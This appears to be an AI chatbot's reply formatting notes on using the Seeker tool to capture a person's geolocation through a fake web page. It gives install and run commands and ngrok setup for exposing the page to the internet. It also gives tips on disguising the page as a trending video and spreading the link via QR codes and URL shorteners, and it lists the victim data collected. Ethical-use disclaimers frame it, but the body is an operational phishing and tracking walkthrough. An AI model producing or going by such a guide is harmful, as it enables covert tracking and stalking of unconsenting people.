Here’s a clean and organized version of your content as **Notion-style notes** for educational purposes:

---

# 📍 How to Use Seeker to Get Location via Social Engineering

> ⚠️ Disclaimer:
> 
> This guide is for **ethical hacking** and **cybersecurity learning** only. Always **obtain permission** from your target. Misuse may lead to **legal consequences**.

---

## 🛠️ What is Seeker?

**Seeker** is an open-source tool by **TheWhiteH4t** that creates a **fake web page** to **capture the victim's location** using the device’s **geolocation feature** through **social engineering**.

---

## 🧰 Requirements

- Linux OS (Kali Linux or Ubuntu preferred)
- Python 3
- Git
- Ngrok (for external access)

---

## 🪜 Step-by-Step Setup Guide

### 🔹 1. Install Seeker

```Shell
git clone https://github.com/thewhiteh4t/seeker.git
cd seeker/
chmod +x install.sh
./install.sh
```

### 🔹 2. Run Seeker

Make sure Python 3 is installed.

```Shell
# Run Seeker
python3 seeker.py
```

---

## 🔧 Optional Usage Examples

```Shell
# Generate KML File for Google Earth
python3 seeker.py -k <filename>

# Use a Custom Port
python3 seeker.py -p 1337
./ngrok http 1337

# Use a Specific Template
python3 seeker.py -t 1
```

---

## 🌐 External Access via Ngrok

### 🔹 3. Install Ngrok

Visit [https://ngrok.com](https://ngrok.com/) → Sign up → Copy Linux link.

Install using terminal:

```Shell
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
  | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && \
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
  | sudo tee /etc/apt/sources.list.d/ngrok.list && \
sudo apt update && sudo apt install ngrok
```

### 🔹 4. Authenticate Ngrok

```Shell
ngrok config add-authtoken <Your_Auth_Token>
```

---

## 🎯 Creating the Phishing Page

- Seeker prompts for a **YouTube link** (for disguise)
- Add:
    - Site name/title (e.g., _Watch Now_, _Trending Video_)
    - Optional: Image URL, Description

---

## 🌍 Exposing Localhost to the Internet

```Shell
ngrok http http://localhost:8080
```

- **Ngrok link** will be generated
- This is the link to share (ethically!)

---

## 📲 Delivering the Link

- Share Ngrok URL directly
- Convert to **QR code**: [qr-code-generator.com](https://www.qr-code-generator.com/)
- Use **URL shorteners** (e.g., Bit.ly)

---

## 📌 Capturing Location Data

Once the target opens the link and **allows geolocation**:

- **Seeker logs**:
    - Latitude / Longitude
    - Device Info
    - ISP details
    - Google Maps link to victim's location

---

## 📘 Cybersecurity Student Note

This is a classic **social engineering** technique used in:

- Red teaming
- Penetration testing
- User-awareness training

---

## 🎓 Educational Use Only

**DO NOT USE** for:

- ❌ Stalking
- ❌ Unauthorized tracking
- ❌ Spying

✅ Use only in **authorized labs**, **CTFs**, or **with explicit permission**.

---

Would you like this exported as a Notion-compatible Markdown file or ready-to-import Notion page?